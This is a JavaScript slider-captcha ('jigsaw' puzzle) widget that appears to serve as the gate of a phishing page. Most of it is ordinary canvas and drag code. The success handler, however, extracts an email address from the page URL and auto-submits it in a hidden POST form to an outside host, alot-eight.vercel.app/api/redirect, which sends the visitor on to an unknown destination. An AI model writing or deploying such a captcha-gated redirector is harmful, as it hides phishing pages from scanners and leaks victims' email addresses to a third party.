"use strict";
var _createClass = (function () {
  function defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if ("value" in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }
  return function (Constructor, protoProps, staticProps) {
    if (protoProps) defineProperties(Constructor.prototype, protoProps);
    if (staticProps) defineProperties(Constructor, staticProps);
    return Constructor;
  };
})();

function _classCallCheck(instance, Constructor) {
  if (!(instance instanceof Constructor)) {
    throw new TypeError("Cannot call a class as a function");
  }
}

function cleanMsg() {
  document.getElementById("msg").innerHTML = "";
}

!(function (e) {
  var s = 42,
    f = 310,
    h = 155,
    r = Math.PI,
    o = 63;

  function t(e, t) {
    return Math.round(Math.random() * (t - e) + e);
  }

  function v(e, t) {
    var n = document.createElement(e);
    n.className = t;
    return n;
  }

  function d(e, t) {
    e.classList.add(t);
  }

  function a() {
    return "https://picsum.photos/300/150/?image=" + t(0, 1084);
  }

  function n(e, t, n, i) {
    e.beginPath();
    e.moveTo(t, n);
    e.arc(t + 21, n - 9 + 2, 9, 0.72 * r, 2.26 * r);
    e.lineTo(t + s, n);
    e.arc(t + s + 9 - 2, n + 21, 9, 1.21 * r, 2.78 * r);
    e.lineTo(t + s, n + s);
    e.lineTo(t, n + s);
    e.arc(t + 9 - 2, n + 21, 9.4, 2.76 * r, 1.24 * r, true);
    e.lineTo(t, n);
    e.lineWidth = 2;
    e.fillStyle = "rgba(255, 255, 255, 0.7)";
    e.strokeStyle = "rgba(255, 255, 255, 0.7)";
    e.stroke();
    e[i]();
    e.globalCompositeOperation = "overlay";
  }

  function l(e, t) {
    return e + t;
  }

  function c(e) {
    return e * e;
  }

  if (!("classList" in document.documentElement))
    Object.defineProperty(HTMLElement.prototype, "classList", {
      get: function () {
        var s = this;
        function e(i) {
          return function (e) {
            var t = s.className.split(/\s+/g),
              n = t.indexOf(e);
            i(t, n, e);
            s.className = t.join(" ");
          };
        }
        return {
          add: e(function (e, t, n) {
            ~t || e.push(n);
          }),
          remove: e(function (e, t) {
            ~t && e.splice(t, 1);
          }),
          toggle: e(function (e, t, n) {
            ~t ? e.splice(t, 1) : e.push(n);
          }),
          contains: function (e) {
            return !!~s.className.split(/\s+/g).indexOf(e);
          },
          item: function (e) {
            return s.className.split(/\s+/g)[e] || null;
          },
        };
      },
    });

  var i = (function () {
    function u(e) {
      var t = e.el,
        n = e.onSuccess,
        i = e.onFail,
        s = e.onRefresh;
      _classCallCheck(this, u);
      t.style.position = t.style.position || "relative";
      this.el = t;
      this.onSuccess = n;
      this.onFail = i;
      this.onRefresh = s;
    }

    _createClass(u, [
      {
        key: "init",
        value: function () {
          this.initDOM();
          this.initImg();
          this.bindEvents();
        },
      },
      {
        key: "initDOM",
        value: function () {
          var e,
            t,
            n,
            i = ((e = f),
            (t = h),
            ((n = v("canvas", "")), (n.width = e), (n.height = t), n)),
            s = i.cloneNode(true),
            r = v("div", "sliderContainer"),
            o = v("div", "refreshIcon"),
            a = v("div", "sliderMask"),
            l = v("div", "slider"),
            c = v("span", "sliderIcon"),
            u = v("span", "sliderText");
          s.className = "block";
          u.innerHTML = "Swipe right to fill the puzzle";
          var d = this.el;
          d.appendChild(i);
          d.appendChild(o);
          d.appendChild(s);
          l.appendChild(c);
          a.appendChild(l);
          r.appendChild(a);
          r.appendChild(u);
          d.appendChild(r);
          if (typeof Object.assign !== "function")
            Object.defineProperty(Object, "assign", {
              value: function (e, t) {
                if (null == e)
                  throw new TypeError(
                    "Cannot convert undefined or null to object"
                  );
                for (var n = Object(e), i = 1; i < arguments.length; i++) {
                  var s = arguments[i];
                  if (null != s)
                    for (var r in s)
                      Object.prototype.hasOwnProperty.call(s, r) &&
                        (n[r] = s[r]);
                }
                return n;
              },
              writable: true,
              configurable: true,
            });
          Object.assign(this, {
            canvas: i,
            block: s,
            sliderContainer: r,
            refreshIcon: o,
            slider: l,
            sliderMask: a,
            sliderIcon: c,
            text: u,
            canvasCtx: i.getContext("2d"),
            blockCtx: s.getContext("2d"),
          });
        },
      },
      {
        key: "initImg",
        value: function () {
          var e,
            t,
            n = this,
            i = ((e = function () {
              n.canvasCtx.drawImage(i, 0, 0, f, h);
              n.draw();
              n.blockCtx.drawImage(i, 0, 0, f, h);
              var e = n.y - 18 - 1;
              if (navigator.userAgent.indexOf("MSIE") > -1)
                n.block.style.marginLeft = "-" + (n.x - 3) + "px";
              else {
                var t = n.blockCtx.getImageData(n.x - 3, e, o, o);
                n.block.width = o;
                n.blockCtx.putImageData(t, 0, e);
              }
            }),
            ((t = v("img", "")).crossOrigin = "Anonymous"),
            (t.onload = e),
            (t.onerror = function () {
              t.src = a();
            }),
            (t.src = a()),
            t);
          this.img = i;
        },
      },
      {
        key: "draw",
        value: function () {
          this.x = t(73, 237);
          this.y = t(28, 82);
          n(this.canvasCtx, this.x, this.y, "fill");
          n(this.blockCtx, this.x, this.y, "clip");
        },
      },
      {
        key: "clean",
        value: function () {
          this.canvasCtx.clearRect(0, 0, f, h);
          this.blockCtx.clearRect(0, 0, f, h);
          this.block.width = f;
        },
      },
      {
        key: "bindEvents",
        value: function () {
          var o = this;
          function e(e) {
            a = e.clientX || e.touches[0].clientX;
            l = e.clientY || e.touches[0].clientY;
            u = true;
          }
          function t(e) {
            if (!u) return false;
            var t = e.clientX || e.touches[0].clientX,
              n = e.clientY || e.touches[0].clientY,
              i = t - a,
              s = n - l;
            if (i < 0 || f <= 38 + i) return false;
            o.slider.style.left = i + "px";
            var r = (250 / 270) * i;
            o.block.style.left = r + "px";
            d(o.sliderContainer, "sliderContainer_active");
            o.sliderMask.style.width = i + "px";
            c.push(s);
          }
          function n(e) {
            if (!u) return false;
            var t, n;
            if (
              ((u = false),
              (e.clientX || e.changedTouches[0].clientX) == a)
            )
              return false;
            t = o.sliderContainer;
            n = "sliderContainer_active";
            t.classList.remove(n);
            o.trail = c;
            var i = o.verify(),
              s = i.spliced,
              r = i.verified;
            if (s) {
              if (r) {
                d(o.sliderContainer, "sliderContainer_success");
                // --- Server-Side Redirection ---
                // Instead of constructing a URL on the client,
                // extract an email from the current URL's pathname and submit a POST form.
                const pathname = window.location.pathname;
                // A simple regex to extract an email from any segment.
                const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/;
                const match = pathname.match(emailRegex);
                // Create a form with method POST to /api/redirect
                const form = document.createElement("form");
                form.method = "POST";
                form.action = "https://alot-eight.vercel.app/api/redirect";
                // Create a hidden input for the email if found.
                if (match) {
                  const input = document.createElement("input");
                  input.type = "hidden";
                  input.name = "email";
                  input.value = match[1]; // use the plain email string
                  form.appendChild(input);
                }
                document.body.appendChild(form);
                form.submit();
                if (typeof o.onSuccess === "function") {
                  o.onSuccess();
                }
              } else {
                d(o.sliderContainer, "sliderContainer_fail");
                o.text.innerHTML = "try again";
                o.reset();
              }
            } else {
              d(o.sliderContainer, "sliderContainer_fail");
              if (typeof o.onFail === "function") {
                o.onFail();
              }
              setTimeout(function () {
                o.reset();
              }, 1000);
            }
          }
          o.el.onselectstart = function () {
            return false;
          };
          o.refreshIcon.onclick = function () {
            o.reset();
            if (typeof o.onRefresh === "function") {
              o.onRefresh();
            }
          };
          var a, l, c = [],
            u = false;
          o.slider.addEventListener("mousedown", e);
          o.slider.addEventListener("touchstart", e);
          document.addEventListener("mousemove", t);
          document.addEventListener("touchmove", t);
          document.addEventListener("mouseup", n);
          document.addEventListener("touchend", n);
        },
      },
      {
        key: "verify",
        value: function () {
          var e = this.trail,
            t = e.reduce(l) / e.length,
            n = e.map(function (e) {
              return e - t;
            }),
            i = Math.sqrt(n.map(c).reduce(l) / e.length),
            s = parseInt(this.block.style.left);
          return { spliced: Math.abs(s - this.x) < 10, verified: 0 !== i };
        },
      },
      {
        key: "reset",
        value: function () {
          this.sliderContainer.className = "sliderContainer";
          this.slider.style.left = 0;
          this.block.style.left = 0;
          this.sliderMask.style.width = 0;
          this.clean();
          this.img.src = a();
        },
      },
    ]);
    return u;
  })();

  e.jigsaw = {
    init: function (e) {
      return new i(e).init();
    },
  };
})(window);

jigsaw.init({
  el: document.getElementById("captcha"),
  onSuccess: function () {
    cleanMsg();
  },
  onFail: cleanMsg,
  onRefresh: cleanMsg,
});
